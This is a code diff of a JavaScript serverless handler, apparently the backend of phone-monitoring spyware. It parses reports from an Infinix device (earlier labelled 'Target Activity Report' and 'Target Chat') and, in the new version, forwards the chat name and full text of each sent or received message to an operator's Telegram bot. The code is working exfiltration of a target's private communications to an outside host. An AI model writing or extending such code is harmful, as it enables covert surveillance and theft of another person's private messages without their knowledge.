@@ -9,11 +9,11 @@ export default async function handler(request, response) {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!expectedApiKey || !botToken || !chatId) {
-        return response.status(500).json({ error: 'Server configuration fucked up' });
+        return response.status(500).json({ error: 'Server configuration error' });
     }
 
     if (accessKey !== expectedApiKey) {
-        return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
+        return response.status(401).json({ error: 'Unauthorized' });
     }
 
     if (!data.message) {
@@ -21,20 +21,26 @@ export default async function handler(request, response) {
     }
 
     try {
-        const rawMessage = data.message;
-        
-        const device = (rawMessage.match(/\*\*(INFINIX.*?)\*\*/) || [])[1] || 'N/A';
-        const time = (rawMessage.match(/\*\*Time:\*\* ([\d:]+)/) || [])[1] || 'N/A';
-        const event = (rawMessage.match(/\*\*CHAT SWITCHED\*\*/) || ["Unknown Event"])[0].replace(/\*\*/g, '');
-        const number = (rawMessage.match(/\*\*Now Chatting With:\*\* (.*?)$/s) || [])[1] || 'N/A';
+        const rawText = data.message;
 
-        let formattedMessage = `*🚨 Target Activity Report 🚨*
+        // Har cheez ko kachre se nikalne ka system
+        const device = (rawText.match(/\*\*(INFINIX.*?)\*\*/) || [])[1] || 'N/A';
+        const time = (rawText.match(/\*\*Time:\*\* ([\d:]+)/) || [])[1] || 'N/A';
+        const status = (rawText.match(/\*\*(SENT|RECEIVED)\*\*/) || [])[1] || 'Status N/A';
+        const chat = (rawText.match(/\*\*Chat:\*\* (.*?)(?=\s*\*\*|$)/) || [])[1] || 'Chat N/A';
+        const message = (rawText.match(/\*\*Message:\*\* (.*)/s) || [])[1] || 'Message N/A';
 
-*📱 Device:* \`${device.trim()}\`
-*🕒 Time:* \`${time.trim()}\`
-*⚡ Event:* \`${event.trim()}\`
-*👤 Target Chat:* \`${number.trim()}\`
-        `;
+        // Status ke hisaab se icon chunne ka system
+        const statusIcon = status === 'SENT' ? '📤' : '📥';
+
+        // Final message ko design karne ka system
+        let formattedMessage = `📱 ${device.trim()}
+🕒 Time: ${time.trim()}
+
+${statusIcon} ${status.trim()}
+
+Chat: ${chat.trim()}
+Message: ${message.trim()}`;
 
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
@@ -44,12 +50,11 @@ export default async function handler(request, response) {
             body: JSON.stringify({
                 chat_id: chatId,
                 text: formattedMessage,
-                parse_mode: 'Markdown',
             }),
         });
         
         return response.status(200).json({ status: 'ok' });
     } catch (error) {
-        return response.status(500).json({ error: 'Failed to parse and forward data' });
+        return response.status(500).json({ error: 'Failed to format and forward data' });
     }
 }
